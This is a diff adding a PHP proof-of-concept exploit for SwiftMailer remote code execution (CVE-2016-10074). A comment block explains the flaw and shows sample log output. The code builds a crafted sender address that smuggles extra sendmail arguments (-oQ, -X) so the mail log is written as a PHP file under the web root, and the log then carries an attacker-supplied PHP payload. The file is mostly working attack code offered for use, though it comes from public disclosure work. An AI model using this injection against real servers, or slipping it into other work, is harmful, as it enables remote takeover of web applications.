@@ -1,0 +1,78 @@
+<?php
+ 
+/*
+ 
+SwiftMailer <= 5.4.5-DEV Remote Code Execution (CVE-2016-10074)
+ 
+Discovered/Coded by:
+ 
+Dawid Golunski
+https://legalhackers.com
+ 
+Full Advisory URL:
+https://legalhackers.com/advisories/SwiftMailer-Exploit-Remote-Code-Exec-CVE-2016-10074-Vuln.html
+
+Exploit code URL:
+https://legalhackers.com/exploits/CVE-2016-10074/SwiftMailer_PoC_RCE_Exploit.txt
+
+Follow the feed for updates:
+
+https://twitter.com/dawid_golunski
+
+ 
+A simple PoC (working on Sendmail MTA)
+ 
+It will inject the following parameters to sendmail command:
+ 
+Arg no. 0 == [/usr/sbin/sendmail]
+Arg no. 1 == [-t]
+Arg no. 2 == [-i]
+Arg no. 3 == [-fattacker\]
+Arg no. 4 == [-oQ/tmp/]
+Arg no. 5 == [-X/var/www/cache/phpcode.php]
+Arg no. 6 == ["@email.com]
+
+
+which will write the transfer log (-X) into /var/www/cache/phpcode.php file.
+Note /var/www/cache must be writable by www-data web user.
+
+The resulting file will contain the payload passed in the body of the msg:
+ 
+09607 <<< Content-Type: text/html; charset=us-ascii
+09607 <<< 
+09607 <<< <?php phpinfo(); ?>
+09607 <<< 
+09607 <<< 
+09607 <<< 
+ 
+ 
+See the full advisory URL for the exploit details.
+ 
+*/
+ 
+ 
+// Attacker's input coming from untrusted source such as $_GET , $_POST etc.
+// For example from a Contact form with sender field
+ 
+$email_from = '"attacker\" -oQ/tmp/ -X/var/www/cache/phpcode.php "@email.com';
+
+// ------------------
+ 
+// mail() param injection via the vulnerability in SwiftMailer
+
+require_once 'lib/swift_required.php';
+// Mail transport
+$transport = Swift_MailTransport::newInstance();
+// Create the Mailer using your created Transport
+$mailer = Swift_Mailer::newInstance($transport);
+
+// Create a message
+$message = Swift_Message::newInstance('Swift PoC exploit')
+  ->setFrom(array($email_from => 'PoC Exploit Payload'))
+  ->setTo(array('receiver@domain.org', 'other@domain.org' => 'A name'))
+  ->setBody('Here is the message itself')
+  ;
+// Send the message with PoC payload in 'from' field
+$result = $mailer->send($message);
+
+?>
